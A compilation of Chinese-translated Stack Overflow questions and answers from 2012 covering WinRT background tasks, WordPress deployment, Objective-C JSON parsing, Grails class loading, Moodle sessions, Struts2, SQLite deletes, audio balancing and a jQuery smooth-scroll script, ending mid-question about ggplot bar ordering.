在我的情况下，将 val 定义移到隐式 val 定义之后就足够了，不清楚为什么。分配给 val 定义的方法实际上是在实际调用它的方法之前定义的。

# windows-8 - 在后台任务中实例化 WriteableImage

> ID：13328503
> 
> 赞同：4
> 
> 时间：2012-11-11T04:09:47.313
> 
> 标签：windows-8, windows-runtime

我正在编写一个带有动态磁贴的 Windows 8 应用商店应用程序。每个动态磁贴都是需要每*x*分钟刷新一次的图像。我正在使用带有时间触发器的后台任务来生成我的图像并刷新图块。

生成我的图像意味着创建一个新图像并在其上绘制我的东西，但由于某种原因，我在尝试创建 WriteableBitmap 的新实例时遇到了异常：

```
var newImage = new Windows.UI.Xaml.Media.Imaging.WriteableBitmap(10, 10); 
```

或者

> var newImage = BitmapFactory.New(10, 10);

抛出此异常：

> 应用程序调用了为不同线程编组的接口。（来自 HRESULT 的异常：0x8001010E (RPC_E_WRONG_THREAD)）

我的印象是因为后台任务中没有 UI 线程，但话说回来，为什么 WriteableBitmap 需要 UI 线程？

知道如何解决这个问题吗？如何在后台任务中实例化 WriteableBitmap？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-06-20T14:04:34.157

事实证明这在 Windows 8 中是不可能的。

在后续版本 Win 8.1 和 UWP 中通过[XamlBackgroundTask 实现了它](https://msdn.microsoft.com/en-us/library/windows/apps/xaml/windows.ui.xaml.media.imaging.xamlrenderingbackgroundtask.aspx)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-10-16T14:40:04.947

您仍然可以使用以下代码：

```
 CoreApplication.MainView.CoreWindow.Dispatcher.RunAsync(CoreDispatcherPriority.Normal, 
            () =>{
                // Your UI update code goes here!
                WriteableBitmap writeableBmp = BitmapFactory.New(imageWidth, imageHeight);
            }); 
```

但很可能你会得到另一个异常 (InvalidOperationException) 说：在意外的时间调用了一个方法。WinRT 信息：无法创建新视图，因为尚未创建主窗口。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-11T06:12:23.017

您可以使用`Dispatcher`

```
Application.Current.Dispatcher.Invoke(
    DispatcherPriority.Normal,
    new Action(() => createBitmap)
); 
```

**更新**

```
Dispatcher.RunAsync
    (CoreDispatcherPriority.Normal, 
    () => new WriteableBitmap(10, 10)); 
```

# php - WordPress 开发 VS 生产环境

> ID：13328505
> 
> 赞同：3
> 
> 时间：2012-11-11T04:11:49.340
> 
> 标签：php, mysql, wordpress, development-environment, production-environment

我即将使用 WordPress 作为 CMS 并进行大量自定义，但我的问题是，我应该如何将开发与生产同步？

假设不使用 WordPress，一个典型的开发周期是在本地开发页面，并创建数据库脚本。然后，当一切准备就绪时，它就会发布到网站上。然后再一次，更多的数据库和代码更改，然后只有更改被更新/应用，等等。

现在，使用 WordPress，您可以获得所有出色的功能（一个示例是博客、评论、几乎准备就绪的 CMS 等）。但是部署很痛苦！理想情况下，我宁愿保持上面描述的典型开发周期。因此，我将在本地（来自 wordpress.org）实施 WordPress，然后将更改推送到我的生产服务器。

所以，假设我在 WordPress 本地创建一个新页面（我永远不会在服务器上创建页面，全部在本地，我会找到一种方法为服务器禁用 wp-admin），创建了许多文件。到目前为止，这还不是问题。但是，如果我想向新创建的页面添加内容，则该内容将保存到我的本地数据库中。即使该内容是数据库更改，它也被认为（从我的角度来看）应该推送到服务器而不是通过实时服务器添加该内容的新更改（因为该内容被认为是静态的，它不是博客发布或评论，它是一个静态页面）。

现在，新页面内容已保存到数据库中，因此，数据库将在我的本地计算机上完成更改，我应该将这些更改与我将通过 FTP 传输到服务器的文件一起推送到服务器。

我的问题是：

1.  这种方法正确吗？如果不是，你有什么建议

2.  查找数据库差异的最佳方法是什么？使用什么工具？MySQL Workbench 是否提供类似的功能？我打算使用该工具来查找差异，然后为数据库生成更新脚本。这个问题的原因是我通常自己进行更改，并且我知道如何跟踪它们，但是现在，这些数据库更改是由 WordPress 生成的，我需要对它们进行逆向工程以找出进行了哪些更改。

3.  假设我已经完成了第 2 步，那么该脚本中是否有任何内容需要修改？比如服务器名称？例如，WordPress 是否对服务器名称进行硬编码？

因此，总结一下并为您提供有关我的开发环境的更多信息，我使用 XAMPP 在 Windows 7 上进行开发，并设置了 PHP 和 MySQL。我还使用 Mercurial 进行源代码控制。如上所述，我将使用 WordPress 作为解决方案的一部分，并打算使用它来帮助我创建 CMS 解决方案。我将在本地使用它来生成页面，并在在线禁用该功能（仅针对博客文章和类似条目保持在线）。我这样做是为了保持同步。如果我在本地创建一个页面，一些数据会保存到数据库中。现在，我如何同步/上传？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T22:33:03.293

好的，经过进一步调查，这就是我的结论。

1.  所有主题开发都应该是版本控制的
2.  所有插件开发都应该是版本控制的
3.  页面和帖子的内容不是开发过程的一部分，这是内容，只能备份。

这样，您无需担心数据库更改...等。

希望这对每个人都有帮助。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-11-11T14:24:31.183

您可能会使用版本控制系统？正在开发什么操作系统，例如 Win 或 Linux？什么是生产操作系统？我使用[http://serverpress.com](http://serverpress.com)作为我的测试环境，尽管还有其他的，WAMP，LAMP 等。

# iphone - 从 URL 检索和显示 JSON 数据（objective-C）

> ID：13328508
> 
> 赞同：0
> 
> 时间：2012-11-11T04:12:26.653
> 
> 标签：iphone, objective-c, json, asihttprequest

我正在做作业以使用单例模式和`ASIHTTPRequest`.

JSON 格式的 URL 中的数据如下所示：

```
 { "data": 
        { "current_condition": 
            [ {
             "cloudcover": "51", 
             "humidity": "66", 
             "observation_time": "12:44 PM", 
             "precipMM": "0.0", 
             "pressure": "1002", 
             "temp_C": "30", 
             "temp_F": "86", 

        "visibility": "10", 
         "weatherCode": "116",  
         "weatherDesc": [ {"value": "Partly Cloudy" } ], 
         "weatherIconUrl": [ {"value": "http:\/\/www.worldweatheronline.com\/images\/wsymbols01_png_64\/wsymbol_0004_black_low_cloud.png" } ], 
         "winddir16Point": "S", 
         "winddirDegree": "170", 
         "windspeedKmph": "19", 
         "windspeedMiles": "12" } ],  
        "request": [ {
                    "query": "Lat 22.49 and Lon 114.14", 
                    "type": "LatLon" } ],  
        "weather": [ {
                    "date": "2012-06-06", 
                    "precipMM": "0.0", 
                    "tempMaxC": "30", 
                    "tempMaxF": "86", 
                    "tempMinC": "26", 
                    "tempMinF": "79", 
                    "weatherCode": "113",  
                    "weatherDesc": [ {"value": "Sunny" } ],  
                    "weatherIconUrl": [ {"value": "http:\/\/www.worldweatheronline.com\/images\/wsymbols01_png_64\/wsymbol_0001_sunny.png" } ], 
                    "winddir16Point": "SE", 
                    "winddirDegree": "136", 
                    "winddirection": "SE", 
                    "windspeedKmph": "17", 
                    "windspeedMiles": "11" 
                    }, 
                    {
                    "date": "2012-06-07", 
                    "precipMM": "0.1", 
                    "tempMaxC": "30", 
                    "tempMaxF": "87", 
                    "tempMinC": "27", 
                    "tempMinF": "80", 
                    "weatherCode": "113",  
                    "weatherDesc": [ {"value": "Sunny" } ],  
                    "weatherIconUrl": [ {"value": "http:\/\/www.worldweatheronline.com\/images\/wsymbols01_png_64\/wsymbol_0001_sunny.png" } ], 
                    "winddir16Point": "ESE", 
                    "winddirDegree": "121", 
                    "winddirection": "ESE", 
                    "windspeedKmph": "15", 
                    "windspeedMiles": "10" 
                    }, 
                    {
                    "date": "2012-06-08", 
                    "precipMM": "2.1", 
                    "tempMaxC": "31", 
                    "tempMaxF": "87", 
                    "tempMinC": "27", 
                    "tempMinF": "81", 
                    "weatherCode": "116",  
                    "weatherDesc": [ {"value": "Partly Cloudy" } ],  
                    "weatherIconUrl": [ {"value": "http:\/\/www.worldweatheronline.com\/images\/wsymbols01_png_64\/wsymbol_0002_sunny_intervals.png" } ], 
                    "winddir16Point": "SSE", 
                    "winddirDegree": "166", 
                    "winddirection": "SSE", 
                    "windspeedKmph": "17", 
                    "windspeedMiles": "11" 
                    }, 
                    {
                    "date": "2012-06-09", 
                    "precipMM": "2.8", 
                    "tempMaxC": "32", 
                    "tempMaxF": "89", 
                    "tempMinC": "28", 
                    "tempMinF": "82", 
                    "weatherCode": "176",  
                    "weatherDesc": [ {"value": "Patchy rain nearby" } ],  
                    "weatherIconUrl": [ {"value": "http:\/\/www.worldweatheronline.com\/images\/wsymbols01_png_64\/wsymbol_0009_light_rain_showers.png" } ], 
                    "winddir16Point": "SSW", 
                    "winddirDegree": "198", 
                    "winddirection": "SSW", 
                    "windspeedKmph": "17", 
                    "windspeedMiles": "11" 
                    }, 
                    {
                    "date": "2012-06-10", 
                    "precipMM": "13.0", 
                    "tempMaxC": "32", 
                    "tempMaxF": "90", 
                    "tempMinC": "28", 
                    "tempMinF": "82", 
                    "weatherCode": "116",  
                    "weatherDesc": [ {"value": "Partly Cloudy" } ],  
                    "weatherIconUrl": [ {"value": "http:\/\/www.worldweatheronline.com\/images\/wsymbols01_png_64\/wsymbol_0002_sunny_intervals.png" } ], 
                    "winddir16Point": "SW", 
                    "winddirDegree": "220", 
                    "winddirection": "SW", 
                    "windspeedKmph": "22", 
                    "windspeedMiles": "14" 
                    } ]
    }
} 
```

在我的 AppData.m 中，代码如下所示：

```
 - (void)requestFinished:(ASIHTTPRequest *)request {
        NSData* responseData = [request responseData];
        NSDictionary* resultDict = [NSJSONSerialization JSONObjectWithData:responseData options:kNilOptions error:NULL];
        NSDictionary* dataDict = [resultDict objectForKey:@"data"];
        NSArray* myArray = [dataDict objectForKey:@"weather"];

        if(weatherDataArray == nil)
            weatherDataArray = [[NSMutableArray alloc] init];
        [weatherDataArray setArray:myArray];
} 
```

在 myWeather.m 中，代码如下：

```
 - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
        myWeatherDataCell *cell = [tableView dequeueReusableCellWithIdentifier:@"myWeatherDataCell"];

        // get the view controller's info dictionary based on the indexPath's row
        NSDictionary* item = [[AppData sharedData].weatherDataArray objectAtIndex:indexPath.row];
        cell.maxTempLabel.text = [item objectForKey:@"tempMaxC"];
        cell.minTempLabel.text = [item objectForKey:@"tempMinC"];
        cell.dateLabel.text = [item objectForKey:@"date"];
        cell.detailTextLabel.adjustsFontSizeToFitWidth = YES;

        NSArray* weatherIconUrl =  [item objectForKey:@"weatherIconUrl"];
        NSDictionary* value = [weatherIconUrl valueForKey:@"value"];

        NSString* urlString = [NSString stringWithFormat:@"%@",value];

        NSData* url = [[NSData alloc] initWithContentsOfURL:[NSURL URLWithString:urlString]];
        cell.iconView.image = [UIImage imageWithData:url];

        NSLog(@"weatherIconUrl" "%@",urlString);

        return cell;
} 
```

表格视图可以显示

```
 cell.maxTempLabel.text = [item objectForKey:@"tempMaxC"];
    cell.minTempLabel.text = [item objectForKey:@"tempMinC"];
    cell.dateLabel.text = [item objectForKey:@"date"]; 
```

除了 iconview.image。

我尝试使用 NSlog

```
 NSString* urlString = [NSString stringWithFormat:@"%@",value]; 
```

它可以显示如下：

```
2012-11-11 11:51:46.100 MyWeather[1583:1a603] weatherIconUrl(
    "http://www.worldweatheronline.com/images/wsymbols01_png_64/wsymbol_0001_sunny.png"
)
2012-11-11 11:51:46.101 MyWeather[1583:1a603] weatherIconUrl(
    "http://www.worldweatheronline.com/images/wsymbols01_png_64/wsymbol_0017_cloudy_with_light_rain.png"
)
2012-11-11 11:51:46.102 MyWeather[1583:1a603] weatherIconUrl(
    "http://www.worldweatheronline.com/images/wsymbols01_png_64/wsymbol_0001_sunny.png"
)
2012-11-11 11:51:46.102 MyWeather[1583:1a603] weatherIconUrl(
    "http://www.worldweatheronline.com/images/wsymbols01_png_64/wsymbol_0001_sunny.png"
)
2012-11-11 11:51:46.103 MyWeather[1583:1a603] weatherIconUrl(
    "http://www.worldweatheronline.com/images/wsymbols01_png_64/wsymbol_0004_black_low_cloud.png"
) 
```

但是当我尝试 NSLog NSData* url 时，结果是（null）。

所以我认为当“NSString * urlString”将数据传递给“NSData * url”时我被困住了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T07:48:27.900

您可以使用[JsonKit](https://github.com/johnezang/JSONKit) 解析 Jdon 数据并将其转换为字典从 ASSIHTTPRequest 得到响应后像这样

```
- (void) requestFinished:(ASIHTTPRequest *)request {
// Use when fetching text data

NSString *responseString = [request responseString];

// Json  dictionary
NSDictionary *resultsDictionary = [responseString objectFromJSONString];

} 
```

在你的情况下，如果你想得到云层，你可能会说

```
 NSString *cloudCover =[[[resultsDictionary objectForKey:@"data"]objectForKey:@"current_condition"] objectAtIndex:0]; 
```

希望有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T16:03:47.960

正如我在评论中所说，您的变量“weatheIconURL”实际上是一个包含一个对象（字典）的数组，因此您可以使用 lastObject 来修复该行。所以这几行需要改为：

```
 NSDictionary* weatherIconUrl =  [[item objectForKey:@"weatherIconUrl"] lastObject];
        NSString* urlString = [weatherIconUrl valueForKey:@"value"];
        NSData* url = [[NSData alloc] initWithContentsOfURL:[NSURL URLWithString:urlString]];
        cell.iconView.image = [UIImage imageWithData:url]; 
```

# grails - Grails：将插件类导入 _Events.groovy

> ID：13328510
> 
> 赞同：2
> 
> 时间：2012-11-11T04:13:17.307
> 
> 标签：grails, groovy, classpath

我创建了一个 Grails 插件，它添加了一个自定义测试类型类（扩展`GrailsTestTypeSupport`）和自定义测试结果类（扩展`GrailsTestTypeResult`），以支持我在脚本`other`阶段运行的自定义测试类型。`test-app`在我的本地机器上测试这个已经很顺利了，但是......

当我打包插件以在我的应用程序中使用时，测试在我们的 CI 服务器 (Jenkins) 上爆炸了。这是詹金斯吐出的错误：

```
unable to resolve class CustomTestResult  @ line 58, column 9.
       new CustomTestResult(tests.size() - failed, failed) 
```

看来我不能简单地`import`将这些类放入`_Events.groovy`中，并且这些类不在类路径中。但如果我能弄清楚如何让它们进入类路径，我会被诅咒的。这是我到目前为止所拥有的（在`_Events.groovy`）：

```
import java.lang.reflect.Constructor

eventAllTestsStart = {
  if (!otherTests) otherTests = []

  loadCustomTestResult()
  otherTests << createCustomTestType()
}

private def createCustomTestType(String name = 'js', String relativeSourcePath = 'js') {
  ClassLoader parent = getClass().getClassLoader()
  GroovyClassLoader loader = new GroovyClassLoader(parent)
  Class customTestTypeClass = loader.parseClass(new File("${customTestPluginDir}/src/groovy/custom/test/CustomTestType.groovy"))
  Constructor customTestTypeConstructor = customTestTypeClass.getConstructor(String, String)
  def customTestType = customTestTypeConstructor.newInstance(name, relativeSourcePath)

  customTestType
}

private def loadCustomTestResult() {
  ClassLoader parent = getClass().getClassLoader()
  GroovyClassLoader loader = new GroovyClassLoader(parent)
  Class customTestResultClass = loader.parseClass(new File("${customTestPluginDir}/src/groovy/custom/test/CustomTestResult.groovy"))
} 
```

当前：`CustomTestResult`仅从内部引用`CustomTestType`。据我所知，`_Events.groovy`正在加载`CustomTestType`，但它失败了，因为它坚持认为`CustomTestResult`它不在类路径上。

暂时搁置一下，将插件提供的类放到类路径中以开始测试周期的开销如此之大似乎很疯狂……我不太确定我在哪里被绊倒了。任何帮助或指示将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T14:48:48.467

您是否尝试过通过可通过`classLoader`变量 in访问的 ClassLoader 简单地加载有问题的类`_Events.groovy`？

```
Class customTestTypeClass = classLoader.loadClass('custom.test.CustomTestType')
// use nice groovy overloading of Class.newInstance
return customTestTypeClass.newInstance(name, relativeSourcePath) 
```

您应该在此过程中迟到，`eventAllTestsStart`以使其有效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-15T01:59:44.680

[@Ian Roberts 的](https://stackoverflow.com/users/592139/ian-roberts) [回答](https://stackoverflow.com/questions/13328510/grails-importing-plugin-classes-to-events-groovy/13345796#13345796)让我大致指出了正确的方向，并结合了[这个](https://github.com/hauner/grails-cucumber/blob/master/scripts/_Events.groovy)[插件](https://github.com/hauner/grails-cucumber/blob/master/scripts/_Events.groovy)`_Events.groovy`的脚本，我设法通过了这个解决方案：[`grails-cucumber`](https://github.com/hauner/grails-cucumber/blob/master/scripts/_Events.groovy)

首先，`_Events.groovy`变成了这样：

```
eventAllTestsStart = { if (!otherTests) otherTests = [] }

eventTestPhasesStart = { phases ->
  if (!phases.contains('other')) { return }

  // classLoader.loadClass business per Ian Roberts:
  otherTests << classLoader.loadClass('custom.test.CustomTestType').newInstance('js', 'js')
} 
```

这比我在这个线程开始时的可读性要强得多。但是：我处于大致相同的位置：`ClassNotFoundException`当`_Events.groovy`它`CustomTestType`试图创建`custom.test. CustomTestResult`. 所以在里面`CustomTestType`，我添加了以下方法：

```
private GrailsTestTypeResult createResult(passed, failed) {
  try {
    return new customTestResult(passed, failed)
  } catch(ClassNotFoundException cnf) {
    Class customTestResult = buildBinding.classLoader.loadClass('custom.test.CustomTestResult')
    return customTestResult.newInstance(passed, failed)
  }
} 
```

所以伊恩是对的，因为`classLoader`我来救援了——我只是在两个地方需要它的魔力。

# php - 从服务器返回值到应用程序

> ID：13328511
> 
> 赞同：0
> 
> 时间：2012-11-11T04:13:23.330
> 
> 标签：php, objective-c, ios, xcode

我正在对我的应用程序的登录/注册功能进行编程，并且到目前为止一切都井井有条。

当用户登录时，我的 php 脚本如果成功则返回 1，如果不成功则返回 0。当他们尝试注册时也是如此。

我的问题是，如何让我的应用程序识别 php 函数返回的值并做出相应的响应？

```
- (int) authenticateClient {
NSString *loginWeb = [NSString stringWithFormat:(@"http://localhost/login.php?uname=%@&pass=%@&submit=Log%%20In"), user, pass];
NSURL *login = [NSURL URLWithString:loginWeb];
NSData *loginData = [NSData dataWithContentsOfURL: login];
NSMutableURLRequest *loginRequest = [[NSMutableURLRequest alloc] init];
[loginRequest setURL:login];
[loginRequest setTimeoutInterval:10]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:29:08.877

听起来您想创建一个 API 供您的移动应用程序访问。在 php 脚本中，您可以回显要检索的数据的 json 容器，并让您的应用程序将主体解析为 json 并执行任何必要的操作。

# session - moodle "无法初始化 PHP 会话，请确认您的浏览器接受 cookie。"

> ID：13328515
> 
> 赞同：2
> 
> 时间：2012-11-11T04:13:57.430
> 
> 标签：session, google-chrome, cookies, session-cookies, moodle

我正在尝试在本地安装 MOODLE，我遇到了这个问题

```
Can not initialize PHP session, please verify that your browser accepts cookies. 
```

我正在尝试按照以下步骤启用 cookie（我正在使用 chrome） [https://support.google.com/accounts/bin/answer.py?hl=en&answer=61416](https://support.google.com/accounts/bin/answer.py?hl=en&answer=61416)

我还尝试配置 php.ini
[http://support.qualityunit.com/021373-How-To-Enable-Session-Support-for-PHP](http://support.qualityunit.com/021373-How-To-Enable-Session-Support-for-PHP)

但仍然无法解决

任何人都可以帮助我吗？

```
php configuration <br/>
session
Session Support enabled
Registered save handlers    files user
Registered serializer handlers  php php_binary wddx

Directive   Local Value Master Value
session.auto_start  Off Off
session.cache_expire    180 180
session.cache_limiter   nocache nocache
session.cookie_domain   no value    no value
session.cookie_httponly Off Off
session.cookie_lifetime 0   0
session.cookie_path /   /
session.cookie_secure   Off Off
session.entropy_file    no value    no value
session.entropy_length  0   0
session.gc_divisor  1000    1000
session.gc_maxlifetime  1440    1440
session.gc_probability  1   1
session.hash_bits_per_character 5   5
session.hash_function   0   0
session.name    PHPSESSID   PHPSESSID
session.referer_check   no value    no value
session.save_handler    files   files
session.save_path   D:\EasyPHP-12.1/tmp D:\EasyPHP-12.1/tmp
session.serialize_handler   php php
session.upload_progress.cleanup On  On
session.upload_progress.enabled On  On
session.upload_progress.freq    1%  1%
session.upload_progress.min_freq    1   1
session.upload_progress.name    PHP_SESSION_UPLOAD_PROGRESS PHP_SESSION_UPLOAD_PROGRESS <br/>
session.upload_progress.prefix  upload_progress_    upload_progress_ <br/>
session.use_cookies On  On <br/>
session.use_only_cookies    On  On <br/>
session.use_trans_sid   0   0 <br/> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-07-30T21:37:08.710

通常这是一个 php 配置问题，其中 php 无法写入会话文件夹。确切的路径和用户因操作系统而异，但我会尝试总结一下。

首先，我们需要查看会话是否存在问题，但我们需要知道 php 使用哪个配置文件以及将会话保存到哪个路径。要做到这一点：

1.  在你的moodle安装文件夹中创建一个名为info.php的新文件，
2.  添加`<?php phpinfo(); ?>`
3.  并保存。
4.  将您的浏览器发送到您的网络服务器上的该页面。

这将向您展示几件事：

*   “session.save_path”是 php 试图保存会话文件的地方。
*   “APACHE_RUN_USER”是运行 apache 的用户。
*   “加载的配置文件”将显示 php 从哪个文件读取这些设置。

如果您的 session.save_path 已设置，请检查该文件夹的权限。它们应该归 Web 服务器用户所有。一旦你解决了这个问题，重新加载moodle屏幕。

如果您的 session.save_path 未设置，请暂时将其设置为“/tmp/”。这是一个始终可写但不是很安全的位置。重新启动您的 Web 服务器并重新加载 Moodle 屏幕。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-01-07T07:13:34.990

嗨，我遇到了同样的问题。我只是从浏览器中清除站点数据并工作。

# jsp - Struts 2 带有索引的循环对象数组列表

> ID：13328518
> 
> 赞同：1
> 
> 时间：2012-11-11T04:14:13.173
> 
> 标签：jsp, struts2

我有一个 arrayList，其中有一个 bean 的对象。在视图中，我正在使用`<c:foreach>`标签迭代和打印列表。

我将此列表打印到表格中，因此我需要在`<tr>`标签内一次打印列表的 4 个元素。然后是另一个中的下 4 个元素`<tr>`，依此类推。

我该怎么做？是否有要使用的索引，以便我可以存储该值，并且仅在下次迭代列表时从那里开始？

例如我的假设：

```
<for i=list.length i++>
{
   <tr>
       <td>${ListElement}</td>
   </tr>
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:39:17.840

```
 <s:iterator var="listVar" value="%{ListElement}" status="entryStatus">
     <s:property value="#entryStatus.count"/> <!-- start's from 0 -->
     <s:property value="#entryStatus.index"/> <!-- start's from 1 -->
     <s:property value="%{ListElement[#entryStatus.index].yourBeanPropertyName}"/>
     <s:property value="%{#listVar[#entryStatus.index].yourBeanPropertyName}"/>
 </s:iterator> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T12:30:47.593

使用带有,和属性`<s:iterator>`的标签[http://struts.apache.org/2.x/docs/iterator.html](http://struts.apache.org/2.x/docs/iterator.html)。`begin``end``status`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T20:32:38.500

我使用标签以及查找行数的倍数。代码算法：

```
<c:foreach varStatus=x items=beanObject>
  if(x.index / 4 == 0)
{
  NEW ROW
}

</c:foreach> 
```

# sqlite - 删除sqlite中的记录

> ID：13328522
> 
> 赞同：-1
> 
> 时间：2012-11-11T04:15:24.640
> 
> 标签：sqlite

有一个名为 commonprofit 的表，三个字段：name ，date，profit。
`select name,max(date) from commonprofit group by name`
该命令可以获得许多日期为组最大的记录`name`，现在我想删除该命令选择的每条记录，为什么我不能这样做如下：

```
drop from commonprofit where date in (select  name,max(date)   from commonprofit  group  by name);

delete  from commonprofit where date=max(date)  group  by name;

delete from commonprofit where date in (select  name,max(date)   from commonprofit  group  by name); 
```

他们都做不到。

原始数据是：

```
name  date  profit
1   2011/12 42359
1   2010/12 32863
1   2009/12 24293
1   2008/12 16436
1   2007/12 15442
2   2011/12 91634
2   2010/12 58410
2   2009/12 50668
2   2008/12 54297
3   2009/12 12352
3   2008/12 12352
3   2007/12 14226 
```

我要删除的是：

```
name    date    profit
1       2011/12 42359
2       2011/12 91634
3       2009/12 12352 
```

我想要的是：

```
name  date  profit
1   2010/12 32863
1   2009/12 24293
1   2008/12 16436
1   2007/12 15442
2   2010/12 58410
2   2009/12 50668
2   2008/12 54297
3   2008/12 12352
3   2007/12 14226 
```

我能怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T10:35:37.960

删除此类记录的最简单方法是使用单个唯一列标识它们。您没有显示主键，所以我使用`rowid`.
`IN`需要一个带有单列的子查询，所以我们必须使用额外的间接：

```
DELETE FROM commonprofit
WHERE rowid IN (SELECT rowid
                FROM (SELECT rowid,
                             MAX(date)
                      FROM commonprofit
                      GROUP BY name)) 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-11T04:19:46.097

你应该使用`delete`而不是`drop`

该`drop`命令用于删除整个表及其模式定义。用于`delete`从表中删除行。

# android - 音频，平衡来自 2 个来源的声音

> ID：13328523
> 
> 赞同：1
> 
> 时间：2012-11-11T04:15:27.020
> 
> 标签：android, audio, voice, recording, waveform

我正在使用一个电话录音软件（android），它可以记录两个人在电话中的对话。每个电话呼叫的输出是一个音频文件，其中包含来自呼叫者和被呼叫者的声音。

但是，在大多数情况下，运行此软件的手机发出的声音比另一个更清晰。用户要求我使 2 的声音同样清晰。

所以我现在遇到的问题是：我有一个声音文件，其中包含来自 2 个不同音量来源的声音，我应该怎么做才能使来自这 2 个来源的声音的音量在噪音方面不增加。鉴于这是一个电话，所以在特定时间只有一个人在说话。

我看到至少有一个直接的解决方案：制作一个程序来分析声音文件的波形，识别来自声音较小的源的声音文件的一部分，并将其增加到一个看似与另一个平衡的水平。然而，这并不容易实现，我也希望那里有更好的解决方案。你对我有什么建议吗？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T13:02:15.200

这就是我解决这个问题的方法：

1.由于存储的WAV格式，我将音频解码为一系列整数值。
结果是 [xi] ; 0 < 西 < 255

2\. 然后我必须确定 2 个自定义值：
- 噪声阈值？如果 xi > 阈值 => 它不是噪音（很天真！）
- 一段人声的声音应该多长时间？
我自己选择第一个值为 5，第二个值为 100ms

3\. 我的算法将分析 [xi] 到 [Yi] 中，每个 Y 是一个 x 数组，每个 Y 代表一个人类声音块。
之后，我应用 k=2 的 k-mean，得到了 2 个不同的 Y 簇，一个属于声音较大的人，另一个属于声音较小的人。

4.剩下的很简单，我要决定一个参数M，每个x属于一个Y的较软的声音将乘以M，我得到最终的结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:32:40.943

嗯，首先要做的是摆脱所有你不关心的噪音。

您要使用的频谱是：300 Hz 至 3500 Hz

您可以削减所有其他频率，这将大大减少您的噪音。然后，您可以应用自动均衡增益配置文件，甚至可以利用多个设备上可用的 DSP 配置文件。

如果你有机会，我也会看看这份白皮书。（需要 IEEE 或 ACM 会员资格）。

基于DirectShow技术的自动均衡系统及其在广播电台音频广播系统中的应用

[http://ieeexplore.ieee.org/xpl/articleDetails.jsp?tp=&arnumber=5384659&contentType=Conference+Publications&searchWithin%3Dp_Authors%3A.QT.Bai+Xinyue.QT](http://ieeexplore.ieee.org/xpl/articleDetails.jsp?tp=&arnumber=5384659&contentType=Conference+Publications&searchWithin%3Dp_Authors%3A.QT.Bai+Xinyue.QT)。

# javascript - 平滑滚动插件未设置活动状态（JS修改）

> ID：13328526
> 
> 赞同：0
> 
> 时间：2012-11-11T04:16:17.917
> 
> 标签：javascript, jquery, navigation, smooth-scrolling

我在处理平滑滚动以及主导航上的活动状态的脚本时遇到了一些问题。插件：[http ://tinyurl.com/amz4kob](http://tinyurl.com/amz4kob)

请注意，导航栏是固定的，因此实际上没有高度。

我有两个似乎无法克服的问题：

1.  在页面加载时，活动状态将应用于联系链接。如果向下滚动 1px，则活动状态会正确应用于主链接。
2.  我一生都无法弄清楚如何修改脚本以关注具有特定 ID 的元素中的锚点？即我只希望此脚本将活动状态应用于标记内的元素。

任何帮助将不胜感激。

@rrfive

为了让生活更轻松，这里是注释脚本：

```
$(document).ready(function() {
//Get Sections top position
function getTargetTop(elem){

    //gets the id of the section header
    //from the navigation's href e.g. ("#html")
    var id = elem.attr("href");

    //Height of the navigation
    var offset = 0;

    //Gets the distance from the top and subtracts the height of the nav.
    return $(id).offset().top - offset;
}

//Smooth scroll when user click link that starts with #
$('a[href^="#"]').click(function(event) {

    //gets the distance from the top of the section refenced in the href.
    var target = getTargetTop($(this));

    //scrolls to that section.
    $('html, body').animate({scrollTop:target}, 500);

    //prevent the browser from jumping down to section.
    event.preventDefault();
});

//Pulling sections from main nav.
var sections = $('a[href^="#"]');

// Go through each section to see if it's at the top.
// if it is add an active class
function checkSectionSelected(scrolledTo){
    //How close the top has to be to the section.
    var threshold = 54;

    var i;

    for (i = 0; i < sections.length; i++) {

        //get next nav item
        var section = $(sections[i]);

        //get the distance from top
        var target = getTargetTop(section);

        //Check if section is at the top of the page.
        if (scrolledTo > target - threshold && scrolledTo < target + threshold) {
            sections.removeClass("active");
            section.addClass("active");
        }
    };
}

//Check if page is already scrolled to a section.
checkSectionSelected($(window).scrollTop());

$(window).scroll(function(e){
    checkSectionSelected($(window).scrollTop())
}); 
```

});

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:48:29.740

您使用的插件会检查`<div class="section"></div>`页面上元素的位置，但是因为您已经制作了它们`display:none;`，所以所有部分都从页面顶部返回“0 像素”，并且由于“CONTACT”部分是最后一个在页面上，它停在那里。

因此，只需`display:none;`从`.section`您的 CSS 中删除，它就会正常工作。

```
.section {
    /*display: none; <-- Comment this line out. */
    height: 100%;
    min-width: 990px;
} 
```

# r - 如何使用 ggplot() 更改堆积条形图中的分组

> ID：13328530
> 
> 赞同：0
> 
> 时间：2012-11-11T04:17:20.267
> 
> 标签：r

我正在尝试在分类变量上绘制一系列堆叠的条形聊天（客户满意度为 1 到 5）。我想显示从 1 到 5 的组。但是，R 按数据标签而不是数据值对堆积条形图进行分组。

谁能指出我在图表上做错了什么。ggplot 按其数据标签（按字母顺序而不是从 1 到 5）汇总了满意度（从 1 到 5）。我如何告诉 R 以从 1 到 5 的正确顺序绘制满意度（高度不满意到高度满意）

对不起，我还很新鲜，我没有上传图片的权限。您可能需要运行代码来查看图表。

```
